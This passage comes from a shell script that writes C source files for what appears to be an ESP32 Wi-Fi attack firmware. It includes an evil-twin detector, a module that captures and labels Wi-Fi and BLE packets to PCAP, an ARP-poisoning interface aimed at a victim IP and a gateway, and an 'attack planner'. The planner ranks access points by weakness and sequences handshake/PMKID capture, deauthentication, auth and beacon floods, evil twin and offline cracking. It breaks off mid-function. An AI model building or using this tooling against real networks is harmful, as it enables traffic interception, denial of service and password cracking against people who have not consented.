{
    if (g_lock == NULL || !g_init_done) {
        return 0;
    }

    xSemaphoreTake(g_lock, portMAX_DELAY);
    uint8_t count = g_alert_count;
    xSemaphoreGive(g_lock);

    return count;
}

esp_err_t ai_rogue_detector_get_alert(uint8_t idx, ai_rogue_alert_t *out)
{
    if (out == NULL) {
        return ESP_ERR_INVALID_ARG;
    }

    if (g_lock == NULL || !g_init_done) {
        return ESP_ERR_INVALID_STATE;
    }

    xSemaphoreTake(g_lock, portMAX_DELAY);

    if (idx >= g_alert_count) {
        xSemaphoreGive(g_lock);
        return ESP_ERR_INVALID_ARG;
    }

    *out = g_alerts[idx];

    xSemaphoreGive(g_lock);

    return ESP_OK;
}

/* -------------------------------------------------------------------------
 *  JSON export
 * ----------------------------------------------------------------------- */

static bool json_append(char *buf, size_t bufsz, size_t *off, const char *fmt, ...)
{
    if (buf == NULL || bufsz == 0 || off == NULL || *off >= bufsz) {
        return false;
    }

    va_list args;
    va_start(args, fmt);

    int n = vsnprintf(buf + *off, bufsz - *off, fmt, args);

    va_end(args);

    if (n < 0) {
        return false;
    }

    if ((size_t)n >= bufsz - *off) {
        *off = bufsz - 1;
        return false;
    }

    *off += (size_t)n;
    return true;
}

esp_err_t ai_rogue_detector_json(char *buf, size_t bufsz)
{
    if (buf == NULL || bufsz == 0) {
        return ESP_ERR_INVALID_ARG;
    }

    if (g_lock == NULL || !g_init_done) {
        return ESP_ERR_INVALID_STATE;
    }

    ai_rogue_alert_t snapshot[AI_ROGUE_MAX_ALERTS];
    uint8_t count = 0;

    xSemaphoreTake(g_lock, portMAX_DELAY);

    count = g_alert_count;

    if (count > AI_ROGUE_MAX_ALERTS) {
        count = AI_ROGUE_MAX_ALERTS;
    }

    memcpy(snapshot, g_alerts, sizeof(ai_rogue_alert_t) * count);

    xSemaphoreGive(g_lock);

    size_t off = 0;

    if (!json_append(buf, bufsz, &off, "[")) {
        return ESP_ERR_INVALID_SIZE;
    }

    for (uint8_t i = 0; i < count; i++) {
        char ssid_json[72];
        char reason_json[136];

        escape_json_string(ssid_json, sizeof(ssid_json), snapshot[i].ssid);
        escape_json_string(reason_json, sizeof(reason_json), snapshot[i].reason);

        if (i > 0) {
            if (!json_append(buf, bufsz, &off, ",")) {
                return ESP_ERR_INVALID_SIZE;
            }
        }

        if (!json_append(buf, bufsz, &off,
                         "{\"ssid\":\"%s\","
                         "\"bssid\":\"%02X:%02X:%02X:%02X:%02X:%02X\","
                         "\"oui\":\"%02X:%02X:%02X\","
                         "\"channel\":%u,"
                         "\"flags\":%u,"
                         "\"peer_count\":%u,"
                         "\"reason\":\"%s\"}",
                         ssid_json,
                         snapshot[i].bssid[0],
                         snapshot[i].bssid[1],
                         snapshot[i].bssid[2],
                         snapshot[i].bssid[3],
                         snapshot[i].bssid[4],
                         snapshot[i].bssid[5],
                         snapshot[i].oui[0],
                         snapshot[i].oui[1],
                         snapshot[i].oui[2],
                         (unsigned)snapshot[i].channel,
                         (unsigned)snapshot[i].flags,
                         (unsigned)snapshot[i].peer_count,
                         reason_json)) {
            return ESP_ERR_INVALID_SIZE;
        }
    }

    if (!json_append(buf, bufsz, &off, "]")) {
        return ESP_ERR_INVALID_SIZE;
    }

    return ESP_OK;
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/ai_rogue_detector.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/ai_rogue_detector.h"
#ifndef AI_ROGUE_DETECTOR_H
#define AI_ROGUE_DETECTOR_H

#include <stdint.h>
#include <stdbool.h>
#include <stddef.h>

#include "esp_err.h"

#ifdef __cplusplus
extern "C" {
#endif

/* Maximum number of alerts retained from the last scan. */
#define AI_ROGUE_MAX_ALERTS 16

/* Rogue/evil-twin alert types. */
#define AI_ROGUE_FLAG_DIFF_OUI     0x01  /* Same SSID, different OUI */
#define AI_ROGUE_FLAG_DIFF_CHAN    0x02  /* Same SSID, different channels */
#define AI_ROGUE_FLAG_DIFF_CIPHER  0x04  /* Same SSID, mixed security profile */
#define AI_ROGUE_FLAG_MAC_ANOMALY  0x08  /* Locally administered BSSID */
#define AI_ROGUE_FLAG_VENDOR_MIX   0x10  /* Reserved for future vendor-class mix */

/* Detected rogue candidate. */
typedef struct {
    char    ssid[33];
    uint8_t bssid[6];
    uint8_t oui[3];
    uint8_t channel;
    uint8_t flags;        /* bitmask of AI_ROGUE_FLAG_* */
    uint8_t peer_count;   /* other BSSIDs with same SSID */
    char    reason[64];
} ai_rogue_alert_t;

/**
 * @brief Initialize rogue AP detector.
 */
esp_err_t ai_rogue_detector_init(void);

/**
 * @brief Deinit detector.
 */
void ai_rogue_detector_deinit(void);

/**
 * @brief Scan current AP list for evil-twin candidates.
 *
 * Call after AP table is populated by sniffer.
 * Internally throttled.
 */
esp_err_t ai_rogue_detector_scan(void);

/**
 * @brief Get number of alerts from last scan.
 */
uint8_t ai_rogue_detector_alert_count(void);

/**
 * @brief Get alert by index.
 */
esp_err_t ai_rogue_detector_get_alert(uint8_t idx, ai_rogue_alert_t *out);

/**
 * @brief Return alerts as JSON array.
 */
esp_err_t ai_rogue_detector_json(char *buf, size_t bufsz);

#ifdef __cplusplus
}
#endif

#endif /* AI_ROGUE_DETECTOR_H */
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/ai_rogue_detector.h"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/ai_training.c"
#include "ai_training.h"

#include "ai_classifier.h"
#include "ai_fingerprint.h"
#include "ai_ble_profiler.h"
#include "ai_anomaly.h"
#include "ai_rogue_detector.h"
#include "storage_sd.h"
#include "common_types.h"

#include <string.h>
#include <stdio.h>
#include <inttypes.h>
#include <sys/time.h>

#include "esp_log.h"
#include "esp_system.h"
#include "esp_err.h"
#include "esp_timer.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

static const char *TAG = "ai_train";

#define AI_TRAIN_DLT_IEEE802_11     105u
#define AI_TRAIN_DLT_USER0          147u

#define AI_TRAIN_FLUSH_EVERY        32u
#define AI_TRAIN_CLOSE_TIMEOUT_MS   3000u

typedef struct {
    bool active;
    bool closing;
    uint8_t users;

    FILE *pcap;
    FILE *labels;

    char pcap_path[128];
    char label_path[128];

    uint32_t linktype;

    uint32_t pkt_count;
    uint32_t label_count;
    uint32_t dropped_count;
    uint32_t flush_counter;
} train_capture_t;

static bool g_init_done = false;
static ai_train_mode_t g_mode = AI_TRAIN_MODE_OFF;

static train_capture_t g_wifi_cap;
static train_capture_t g_ble_cap;

static SemaphoreHandle_t g_lock = NULL;

/* -------------------------------------------------------------------------
 *  Helpers
 * ----------------------------------------------------------------------- */

static const char *mode_to_str(ai_train_mode_t mode)
{
    switch (mode) {
        case AI_TRAIN_MODE_WIFI: return "wifi";
        case AI_TRAIN_MODE_BLE:  return "ble";
        case AI_TRAIN_MODE_BOTH: return "both";
        default:                 return "off";
    }
}

static void put_u16_le(uint8_t *p, uint16_t v)
{
    p[0] = (uint8_t)(v & 0xFFu);
    p[1] = (uint8_t)((v >> 8) & 0xFFu);
}

static void put_u32_le(uint8_t *p, uint32_t v)
{
    p[0] = (uint8_t)(v & 0xFFu);
    p[1] = (uint8_t)((v >> 8) & 0xFFu);
    p[2] = (uint8_t)((v >> 16) & 0xFFu);
    p[3] = (uint8_t)((v >> 24) & 0xFFu);
}

static bool wifi_frame_get_bssid(const uint8_t *frame, size_t frame_len, uint8_t out[6])
{
    if (frame == NULL || frame_len < 24 || out == NULL) {
        return false;
    }

    uint16_t fc = (uint16_t)(frame[0] | ((uint16_t)frame[1] << 8));
    uint8_t type = (uint8_t)((fc >> 2) & 0x03u);

    bool to_ds = (fc & 0x0100u) != 0;
    bool from_ds = (fc & 0x0200u) != 0;

    if (type == 0) {
        /* Management frames: BSSID is addr3. */
        memcpy(out, frame + 16, 6);
        return true;
    }

    if (type == 2) {
        if (!to_ds && !from_ds) {
            memcpy(out, frame + 16, 6);
            return true;
        }

        if (to_ds && !from_ds) {
            memcpy(out, frame + 4, 6);
            return true;
        }

        if (!to_ds && from_ds) {
            memcpy(out, frame + 10, 6);
            return true;
        }
    }

    return false;
}

static bool rogue_check_mac(const uint8_t *mac)
{
    if (mac == NULL) {
        return false;
    }

    uint8_t count = ai_rogue_detector_alert_count();

    for (uint8_t i = 0; i < count; i++) {
        ai_rogue_alert_t alert;

        if (ai_rogue_detector_get_alert(i, &alert) != ESP_OK) {
            continue;
        }

        if (memcmp(alert.bssid, mac, 6) == 0) {
            return true;
        }
    }

    return false;
}

/* -------------------------------------------------------------------------
 *  PCAP I/O
 * ----------------------------------------------------------------------- */

static bool pcap_write_header(FILE *f, uint32_t linktype)
{
    if (f == NULL) {
        return false;
    }

    uint8_t hdr[24];

    put_u32_le(hdr + 0, 0xA1B2C3D4u); /* magic */
    put_u16_le(hdr + 4, 2);           /* version major */
    put_u16_le(hdr + 6, 4);           /* version minor */
    put_u32_le(hdr + 8, 0);           /* thiszone */
    put_u32_le(hdr + 12, 0);          /* sigfigs */
    put_u32_le(hdr + 16, 65535u);     /* snaplen */
    put_u32_le(hdr + 20, linktype);   /* network */

    return fwrite(hdr, 1, sizeof(hdr), f) == sizeof(hdr);
}

static bool pcap_write_record(FILE *f,
                              const uint8_t *data,
                              size_t len,
                              uint32_t ts_sec,
                              uint32_t ts_usec)
{
    if (f == NULL || data == NULL || len == 0 || len > 65535u) {
        return false;
    }

    uint8_t hdr[16];

    put_u32_le(hdr + 0, ts_sec);
    put_u32_le(hdr + 4, ts_usec);
    put_u32_le(hdr + 8, (uint32_t)len);
    put_u32_le(hdr + 12, (uint32_t)len);

    if (fwrite(hdr, 1, sizeof(hdr), f) != sizeof(hdr)) {
        return false;
    }

    if (fwrite(data, 1, len, f) != len) {
        return false;
    }

    return true;
}

/* -------------------------------------------------------------------------
 *  Capture lifecycle
 * ----------------------------------------------------------------------- */

static esp_err_t capture_open(train_capture_t *cap,
                              const char *suffix,
                              uint32_t linktype,
                              int64_t timestamp)
{
    memset(cap, 0, sizeof(*cap));

    snprintf(cap->pcap_path,
             sizeof(cap->pcap_path),
             "/sd/train_%" PRId64 "_%s.pcap",
             timestamp,
             suffix);

    snprintf(cap->label_path,
             sizeof(cap->label_path),
             "/sd/train_%" PRId64 "_%s.json",
             timestamp,
             suffix);

    cap->pcap = fopen(cap->pcap_path, "wb");
    if (cap->pcap == NULL) {
        ESP_LOGE(TAG, "Failed to open %s", cap->pcap_path);
        return ESP_FAIL;
    }

    if (!pcap_write_header(cap->pcap, linktype)) {
        ESP_LOGE(TAG, "Failed to write PCAP header to %s", cap->pcap_path);
        fclose(cap->pcap);
        cap->pcap = NULL;
        return ESP_FAIL;
    }

    cap->labels = fopen(cap->label_path, "w");
    if (cap->labels == NULL) {
        ESP_LOGE(TAG, "Failed to open %s", cap->label_path);
        fclose(cap->pcap);
        cap->pcap = NULL;
        return ESP_FAIL;
    }

    fprintf(cap->labels, "[");

    cap->linktype = linktype;
    cap->active = false;
    cap->closing = false;
    cap->users = 0;

    return ESP_OK;
}

static void capture_activate(train_capture_t *cap)
{
    if (g_lock == NULL || cap == NULL) {
        return;
    }

    xSemaphoreTake(g_lock, portMAX_DELAY);

    if (cap->pcap != NULL && cap->labels != NULL) {
        cap->active = true;
        cap->closing = false;
        cap->users = 0;
    }

    xSemaphoreGive(g_lock);
}

static void capture_stop(train_capture_t *cap)
{
    if (g_lock == NULL || cap == NULL) {
        return;
    }

    bool need_close = false;

    xSemaphoreTake(g_lock, portMAX_DELAY);

    if (cap->active || cap->closing || cap->pcap != NULL || cap->labels != NULL) {
        cap->closing = true;
        need_close = true;
    }

    xSemaphoreGive(g_lock);

    if (!need_close) {
        return;
    }

    TickType_t start = xTaskGetTickCount();

    while (true) {
        uint8_t users = 0;

        xSemaphoreTake(g_lock, portMAX_DELAY);
        users = cap->users;
        xSemaphoreGive(g_lock);

        if (users == 0) {
            break;
        }

        if ((xTaskGetTickCount() - start) > pdMS_TO_TICKS(AI_TRAIN_CLOSE_TIMEOUT_MS)) {
            ESP_LOGW(TAG, "Capture close timeout; forcing close");
            break;
        }

        vTaskDelay(pdMS_TO_TICKS(5));
    }

    xSemaphoreTake(g_lock, portMAX_DELAY);

    cap->active = false;
    cap->closing = false;

    if (cap->labels != NULL) {
        fprintf(cap->labels, "\n]\n");
        fclose(cap->labels);
        cap->labels = NULL;
    }

    if (cap->pcap != NULL) {
        fclose(cap->pcap);
        cap->pcap = NULL;
    }

    cap->users = 0;

    xSemaphoreGive(g_lock);
}

static bool capture_acquire(train_capture_t *cap)
{
    if (g_lock == NULL || cap == NULL) {
        return false;
    }

    bool ok = false;

    xSemaphoreTake(g_lock, portMAX_DELAY);

    if (g_init_done && cap->active && !cap->closing &&
        cap->pcap != NULL && cap->labels != NULL) {
        cap->users++;
        ok = true;
    }

    xSemaphoreGive(g_lock);

    return ok;
}

static void capture_release(train_capture_t *cap)
{
    if (g_lock == NULL || cap == NULL) {
        return;
    }

    xSemaphoreTake(g_lock, portMAX_DELAY);

    if (cap->users > 0) {
        cap->users--;
    }

    xSemaphoreGive(g_lock);
}

/* -------------------------------------------------------------------------
 *  Label writing
 * ----------------------------------------------------------------------- */

static void write_label_to_capture(train_capture_t *cap,
                                   const uint8_t *data,
                                   size_t len,
                                   uint32_t ts_sec,
                                   uint32_t ts_usec,
                                   const ai_train_label_t *label)
{
    if (g_lock == NULL || cap == NULL || label == NULL) {
        return;
    }

    xSemaphoreTake(g_lock, portMAX_DELAY);

    if (!cap->active || cap->closing || cap->pcap == NULL || cap->labels == NULL) {
        cap->dropped_count++;
        xSemaphoreGive(g_lock);
        return;
    }

    if (!pcap_write_record(cap->pcap, data, len, ts_sec, ts_usec)) {
        cap->dropped_count++;
        cap->closing = true;
        xSemaphoreGive(g_lock);
        return;
    }

    cap->pkt_count++;

    if (cap->label_count > 0) {
        fprintf(cap->labels, ",\n");
    } else {
        fprintf(cap->labels, "\n");
    }

    char mac_str[20] = "";

    if (label->mac_len == 6) {
        snprintf(mac_str,
                 sizeof(mac_str),
                 "%02X:%02X:%02X:%02X:%02X:%02X",
                 label->mac[0],
                 label->mac[1],
                 label->mac[2],
                 label->mac[3],
                 label->mac[4],
                 label->mac[5]);
    }

    int rc = fprintf(cap->labels,
                     "{\"ts\":%" PRIu64
                     ",\"ch\":%u"
                     ",\"rssi\":%d"
                     ",\"pkt_cls\":%u"
                     ",\"pkt_conf\":%.2f"
                     ",\"dev_cls\":%u"
                     ",\"anomaly\":%s"
                     ",\"anom_score\":%.4f"
                     ",\"rogue\":%s"
                     ",\"flags\":%u"
                     ",\"mac\":\"%s\"}",
                     label->timestamp_us,
                     (unsigned)label->channel,
                     (int)label->rssi,
                     (unsigned)label->pkt_class,
                     (double)label->pkt_confidence,
                     (unsigned)label->device_class,
                     label->is_anomaly ? "true" : "false",
                     (double)label->anomaly_score,
                     label->is_rogue ? "true" : "false",
                     (unsigned)label->flags,
                     mac_str);

    if (rc < 0) {
        cap->dropped_count++;
        cap->closing = true;
        xSemaphoreGive(g_lock);
        return;
    }

    cap->label_count++;
    cap->flush_counter++;

    if ((cap->flush_counter % AI_TRAIN_FLUSH_EVERY) == 0) {
        fflush(cap->pcap);
        fflush(cap->labels);
    }

    xSemaphoreGive(g_lock);
}

/* -------------------------------------------------------------------------
 *  Lifecycle
 * ----------------------------------------------------------------------- */

esp_err_t ai_train_init(void)
{
    if (g_init_done) {
        return ESP_OK;
    }

    if (g_lock == NULL) {
        g_lock = xSemaphoreCreateMutex();
        if (g_lock == NULL) {
            return ESP_ERR_NO_MEM;
        }
    }

    xSemaphoreTake(g_lock, portMAX_DELAY);

    memset(&g_wifi_cap, 0, sizeof(g_wifi_cap));
    memset(&g_ble_cap, 0, sizeof(g_ble_cap));

    g_mode = AI_TRAIN_MODE_OFF;
    g_init_done = true;

    xSemaphoreGive(g_lock);

    ESP_LOGI(TAG, "Training capture initialized");
    return ESP_OK;
}

void ai_train_deinit(void)
{
    ai_train_stop();

    if (g_lock != NULL) {
        xSemaphoreTake(g_lock, portMAX_DELAY);
        g_init_done = false;
        xSemaphoreGive(g_lock);
    }

    ESP_LOGI(TAG, "Training capture deinitialized");
}

/* -------------------------------------------------------------------------
 *  Start / stop
 * ----------------------------------------------------------------------- */

esp_err_t ai_train_start(ai_train_mode_t mode)
{
    if (!g_init_done || g_lock == NULL) {
        return ESP_ERR_INVALID_STATE;
    }

    if (mode == AI_TRAIN_MODE_OFF) {
        return ESP_ERR_INVALID_ARG;
    }

    if (!storage_is_ready()) {
        ESP_LOGW(TAG, "SD card not ready; cannot start training capture");
        return ESP_ERR_INVALID_STATE;
    }

    ai_train_stop();

    bool need_wifi = (mode == AI_TRAIN_MODE_WIFI || mode == AI_TRAIN_MODE_BOTH);
    bool need_ble = (mode == AI_TRAIN_MODE_BLE || mode == AI_TRAIN_MODE_BOTH);

    int64_t timestamp = esp_timer_get_time();

    esp_err_t ret = ESP_OK;

    if (need_wifi) {
        ret = capture_open(&g_wifi_cap, "wifi", AI_TRAIN_DLT_IEEE802_11, timestamp);
        if (ret != ESP_OK) {
            goto fail;
        }
    }

    if (need_ble) {
        ret = capture_open(&g_ble_cap, "ble", AI_TRAIN_DLT_USER0, timestamp);
        if (ret != ESP_OK) {
            goto fail;
        }
    }

    xSemaphoreTake(g_lock, portMAX_DELAY);
    g_mode = mode;
    xSemaphoreGive(g_lock);

    if (need_wifi) {
        capture_activate(&g_wifi_cap);
    }

    if (need_ble) {
        capture_activate(&g_ble_cap);
    }

    ESP_LOGI(TAG, "Training capture started: mode=%s", mode_to_str(mode));
    return ESP_OK;

fail:
    capture_stop(&g_wifi_cap);
    capture_stop(&g_ble_cap);

    xSemaphoreTake(g_lock, portMAX_DELAY);
    g_mode = AI_TRAIN_MODE_OFF;
    xSemaphoreGive(g_lock);

    return ret;
}

esp_err_t ai_train_stop(void)
{
    if (!g_init_done || g_lock == NULL) {
        return ESP_OK;
    }

    ai_train_mode_t mode;

    xSemaphoreTake(g_lock, portMAX_DELAY);
    mode = g_mode;
    g_mode = AI_TRAIN_MODE_OFF;
    xSemaphoreGive(g_lock);

    capture_stop(&g_wifi_cap);
    capture_stop(&g_ble_cap);

    xSemaphoreTake(g_lock, portMAX_DELAY);

    uint32_t wifi_pkts = g_wifi_cap.pkt_count;
    uint32_t wifi_labels = g_wifi_cap.label_count;
    uint32_t wifi_dropped = g_wifi_cap.dropped_count;

    uint32_t ble_pkts = g_ble_cap.pkt_count;
    uint32_t ble_labels = g_ble_cap.label_count;
    uint32_t ble_dropped = g_ble_cap.dropped_count;

    xSemaphoreGive(g_lock);

    (void)mode; (void)wifi_pkts; (void)wifi_labels; (void)wifi_dropped;
    (void)ble_pkts; (void)ble_labels; (void)ble_dropped;
    ESP_LOGI(TAG,
             "Training capture stopped: mode=%s wifi=%" PRIu32 "/%" PRIu32
             " ble=%" PRIu32 "/%" PRIu32 " dropped=%" PRIu32,
             mode_to_str(mode),
             wifi_pkts,
             wifi_labels,
             ble_pkts,
             ble_labels,
             wifi_dropped + ble_dropped);

    return ESP_OK;
}

/* -------------------------------------------------------------------------
 *  Wi-Fi labeling
 * ----------------------------------------------------------------------- */

esp_err_t ai_train_label_wifi(const uint8_t *mac,
                              const uint8_t *frame,
                              size_t frame_len,
                              uint8_t channel,
                              int8_t rssi,
                              uint64_t timestamp_us)
{
    if (!g_init_done || g_lock == NULL) {
        return ESP_ERR_INVALID_STATE;
    }

    if (frame == NULL || frame_len == 0) {
        return ESP_ERR_INVALID_ARG;
    }

    train_capture_t *cap = &g_wifi_cap;

    if (!capture_acquire(cap)) {
        return ESP_ERR_INVALID_STATE;
    }

    /*
     * AI labeling happens outside the capture lock.
     */
    ai_classify_result_t cls_res;
    memset(&cls_res, 0, sizeof(cls_res));

    ai_classifier_predict_meta(frame, frame_len, rssi, channel, &cls_res);

    ai_anomaly_result_t anom_res;
    memset(&anom_res, 0, sizeof(anom_res));

    uint16_t len16 = (frame_len > 65535u) ? 65535u : (uint16_t)frame_len;

    if (ai_anomaly_feed(rssi, len16, timestamp_us) == ESP_OK) {
        ai_anomaly_get_result(&anom_res);
    }

    uint8_t derived_mac[6] = {0};
    const uint8_t *use_mac = NULL;

    if (mac != NULL) {
        use_mac = mac;
    } else if (wifi_frame_get_bssid(frame, frame_len, derived_mac)) {
        use_mac = derived_mac;
    }

    bool is_rogue = rogue_check_mac(use_mac);

    ai_train_label_t label;
    memset(&label, 0, sizeof(label));

    label.timestamp_us = timestamp_us;
    label.channel = channel;
    label.rssi = rssi;
    label.pkt_class = (uint8_t)cls_res.cls;
    label.pkt_confidence = cls_res.confidence;
    label.device_class = AI_FP_UNKNOWN;
    label.is_anomaly = anom_res.is_anomaly;
    label.anomaly_score = anom_res.score;
    label.is_rogue = is_rogue;
    label.flags = 0;

    if (use_mac != NULL) {
        memcpy(label.mac, use_mac, 6);
        label.mac_len = 6;
    }

    uint32_t ts_sec = (uint32_t)(timestamp_us / 1000000ULL);
    uint32_t ts_usec = (uint32_t)(timestamp_us % 1000000ULL);

    write_label_to_capture(cap, frame, frame_len, ts_sec, ts_usec, &label);

    capture_release(cap);

    return ESP_OK;
}

/* -------------------------------------------------------------------------
 *  BLE labeling
 * ----------------------------------------------------------------------- */

esp_err_t ai_train_label_ble(const uint8_t *mac,
                             const uint8_t *adv_data,
                             size_t adv_len,
                             int8_t rssi,
                             uint64_t timestamp_us)
{
    if (!g_init_done || g_lock == NULL) {
        return ESP_ERR_INVALID_STATE;
    }

    if (adv_data == NULL || adv_len == 0) {
        return ESP_ERR_INVALID_ARG;
    }

    train_capture_t *cap = &g_ble_cap;

    if (!capture_acquire(cap)) {
        return ESP_ERR_INVALID_STATE;
    }

    /*
     * Build a minimal ble_info_t for the profiler.
     */
    ble_info_t info;
    memset(&info, 0, sizeof(info));

    if (mac != NULL) {
        memcpy(info.mac, mac, 6);
    }

    info.rssi = rssi;

    ai_ble_profile_t profile;
    memset(&profile, 0, sizeof(profile));

    ai_ble_profiler_classify(&info, adv_data, adv_len, &profile);

    ai_anomaly_result_t anom_res;
    memset(&anom_res, 0, sizeof(anom_res));

    uint16_t len16 = (adv_len > 65535u) ? 65535u : (uint16_t)adv_len;

    if (ai_anomaly_feed(rssi, len16, timestamp_us) == ESP_OK) {
        ai_anomaly_get_result(&anom_res);
    }

    ai_train_label_t label;
    memset(&label, 0, sizeof(label));

    label.timestamp_us = timestamp_us;
    label.channel = 0;
    label.rssi = rssi;
    label.pkt_class = 0;
    label.pkt_confidence = 0.0f;
    label.device_class = (uint8_t)profile.cls;
    label.is_anomaly = anom_res.is_anomaly;
    label.anomaly_score = anom_res.score;
    label.is_rogue = false;
    label.flags = 0;

    if (mac != NULL) {
        memcpy(label.mac, mac, 6);
        label.mac_len = 6;
    }

    uint32_t ts_sec = (uint32_t)(timestamp_us / 1000000ULL);
    uint32_t ts_usec = (uint32_t)(timestamp_us % 1000000ULL);

    write_label_to_capture(cap, adv_data, adv_len, ts_sec, ts_usec, &label);

    capture_release(cap);

    return ESP_OK;
}

/* -------------------------------------------------------------------------
 *  Status
 * ----------------------------------------------------------------------- */

ai_train_mode_t ai_train_get_mode(void)
{
    if (g_lock == NULL) {
        return AI_TRAIN_MODE_OFF;
    }

    xSemaphoreTake(g_lock, portMAX_DELAY);
    ai_train_mode_t mode = g_mode;
    xSemaphoreGive(g_lock);

    return mode;
}

esp_err_t ai_train_json(char *buf, size_t bufsz)
{
    if (buf == NULL || bufsz == 0) {
        return ESP_ERR_INVALID_ARG;
    }

    if (g_lock == NULL || !g_init_done) {
        return ESP_ERR_INVALID_STATE;
    }

    ai_train_mode_t mode;

    bool wifi_active;
    char wifi_pcap[128];
    char wifi_labels[128];
    uint32_t wifi_pkt;
    uint32_t wifi_label;
    uint32_t wifi_drop;

    bool ble_active;
    char ble_pcap[128];
    char ble_labels[128];
    uint32_t ble_pkt;
    uint32_t ble_label;
    uint32_t ble_drop;

    xSemaphoreTake(g_lock, portMAX_DELAY);

    mode = g_mode;

    wifi_active = g_wifi_cap.active;
    snprintf(wifi_pcap, sizeof(wifi_pcap), "%s", g_wifi_cap.pcap_path);
    snprintf(wifi_labels, sizeof(wifi_labels), "%s", g_wifi_cap.label_path);
    wifi_pkt = g_wifi_cap.pkt_count;
    wifi_label = g_wifi_cap.label_count;
    wifi_drop = g_wifi_cap.dropped_count;

    ble_active = g_ble_cap.active;
    snprintf(ble_pcap, sizeof(ble_pcap), "%s", g_ble_cap.pcap_path);
    snprintf(ble_labels, sizeof(ble_labels), "%s", g_ble_cap.label_path);
    ble_pkt = g_ble_cap.pkt_count;
    ble_label = g_ble_cap.label_count;
    ble_drop = g_ble_cap.dropped_count;

    xSemaphoreGive(g_lock);

    int w = snprintf(
        buf,
        bufsz,
        "{\"mode\":\"%s\","
        "\"wifi\":{\"active\":%s,\"pcap\":\"%s\",\"labels\":\"%s\","
        "\"packets\":%" PRIu32 ",\"labels\":%" PRIu32 ",\"dropped\":%" PRIu32 "},"
        "\"ble\":{\"active\":%s,\"pcap\":\"%s\",\"labels\":\"%s\","
        "\"packets\":%" PRIu32 ",\"labels\":%" PRIu32 ",\"dropped\":%" PRIu32 "}}",
        mode_to_str(mode),
        wifi_active ? "true" : "false",
        wifi_pcap,
        wifi_labels,
        wifi_pkt,
        wifi_label,
        wifi_drop,
        ble_active ? "true" : "false",
        ble_pcap,
        ble_labels,
        ble_pkt,
        ble_label,
        ble_drop
    );

    if (w < 0 || (size_t)w >= bufsz) {
        return ESP_ERR_INVALID_SIZE;
    }

    return ESP_OK;
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/ai_training.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/arp_poison.h"
#ifndef ARP_POISON_H
#define ARP_POISON_H

#include <stdatomic.h>
#include "common_types.h"
#include "esp_err.h"

#ifdef __cplusplus
extern "C" {
#endif

esp_err_t arp_poison_init(void);
esp_err_t arp_poison_start(const char *victim_ip, const char *gateway_ip, uint32_t interval_ms);
esp_err_t arp_poison_stop(void);
bool arp_poison_is_active(void);

void arp_relay_set_enabled(bool on);
void arp_poison_print_table(void);
void arp_poison_print_status(void);

/* Observer callbacks for wifi_sniffer */
void arp_feed_packet(const wifi_pkt_msg_t *msg);
void arp_relay_frame(const wifi_pkt_msg_t *msg);

extern atomic_bool g_arp_poison_active;

#ifdef __cplusplus
}
#endif

#endif // ARP_POISON_H
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/arp_poison.h"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/attack_planner.c"
#include "attack_planner.h"
#include "wifi_sniffer.h"
#include "deauth_engine.h"
#include "ai_deauth_predictor.h"
#include "ai_handshake_quality.h"
#include "ai_fingerprint.h"
#include <stdio.h>
#include <string.h>
#include "esp_log.h"
#include "esp_err.h"
#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"

static const char *TAG = "attack_planner";

static SemaphoreHandle_t g_lock;
static planner_stats_t g_stats;

static float score_ap(const ap_info_t *ap)
{
    if (ap == NULL) return 0.0f;

    float score = 0.0f;

    /* Signal strength contributes up to 0.2 */
    if (ap->rssi > -50) score += 0.2f;
    else if (ap->rssi > -60) score += 0.15f;
    else if (ap->rssi > -70) score += 0.1f;
    else if (ap->rssi > -80) score += 0.05f;

    /* Security: older protocols are easier */
    if (!ap->rsn_version && !ap->wpa3_sae) {
        score += 0.25f;
    } else if (ap->rsn_version && !ap->wpa3_sae) {
        score += 0.15f;
    } else if (ap->wpa3_sae) {
        score += 0.05f;
    }

    /* PMF is a penalty */
    if (!ap->pmf_required) {
        score += 0.1f;
    }

    /* Activity: more packets = active target */
    if (ap->pkt_count > 1000) score += 0.15f;
    else if (ap->pkt_count > 100) score += 0.1f;
    else if (ap->pkt_count > 10) score += 0.05f;

    /* HE capable APs tend to be newer and have WPA3 */
    if (ap->he_capable) {
        score -= 0.05f;
    }

    /* Cap at 1.0 */
    if (score > 1.0f) score = 1.0f;
    if (score < 0.0f) score = 0.0f;

    return score;
}

static void build_steps(const ap_info_t *ap, attack_step_t *steps, uint8_t *count)
{
    *count = 0;

    /* Handshake/PMKID capture first */
    if (ap->rsn_version && !ap->wpa3_sae) {
        /* Minimal check: if RSN present, assume PMKID possible */
        steps[(*count)++] = ATTACK_STEP_HANDSHAKE_CAPTURE;
        steps[(*count)++] = ATTACK_STEP_PMKID_CAPTURE;
    } else if (!ap->rsn_version && !ap->wpa3_sae) {
        steps[(*count)++] = ATTACK_STEP_EVIL_TWIN;
        steps[(*count)++] = ATTACK_STEP_BEACON_FLOOD;
    }

    /* Deauth/disassoc to kick clients */
    if (!ap->pmf_required) {
        steps[(*count)++] = ATTACK_STEP_DEAUTH;
    } else {
        steps[(*count)++] = ATTACK_STEP_DISASSOC;
    }

    /* Auth flood if nothing else works */
    steps[(*count)++] = ATTACK_STEP_AUTH_FLOOD;

    /* Final step: offline crack */
    steps[(*count)++] = ATTACK_STEP_OFFLINE_CRACK;
}

const char *attack_step_name(attack_step_t step)
{
    switch (step) {
        case ATTACK_STEP_DEAUTH: return "deauth";
        case ATTACK_STEP_DISASSOC: return "disassoc";
        case ATTACK_STEP_AUTH_FLOOD: return "auth_flood";
        case ATTACK_STEP_HANDSHAKE_CAPTURE: return "handshake_capture";
        case ATTACK_STEP_PMKID_CAPTURE: return "pmkid_capture";
        case ATTACK_STEP_OFFLINE_CRACK: return "offline_crack";
        case ATTACK_STEP_EVIL_TWIN: return "evil_twin";
        case ATTACK_STEP_BEACON_FLOOD: return "beacon_flood";
        default: return "none";
    }
}

esp_err_t attack_planner_init(void)
{
    g_lock = xSemaphoreCreateMutex();
    if (g_lock == NULL) {
